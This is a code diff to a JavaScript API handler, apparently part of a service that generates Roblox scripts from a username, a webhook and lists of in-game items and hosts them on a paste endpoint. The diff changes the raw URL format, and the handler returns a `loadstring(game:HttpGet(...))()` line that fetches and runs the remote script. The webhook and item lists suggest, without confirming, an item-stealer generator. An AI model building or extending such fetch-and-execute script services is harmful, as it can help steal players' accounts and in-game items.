@@ -13,16 +13,14 @@ export default async function handler(req, res) {
     try {
         const script = buildScript(username, webhook, mode, brainrots || [], skins || [], gears || []);
 
-        // Guardar en pastefy interno
         const pasteId = await saveToInternalPaste(
             script,
             `Script para ${username}`,
             userId
         );
 
-        // URL limpia con /raw/
         const baseUrl = process.env.BASE_URL || 'https://oblivionhub.xyz';
-        const rawUrl = `${baseUrl}/raw/${pasteId}`;
+        const rawUrl = `${baseUrl}/api/paste?id=${pasteId}&raw=true`;
 
         return res.status(200).json({
             loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`,
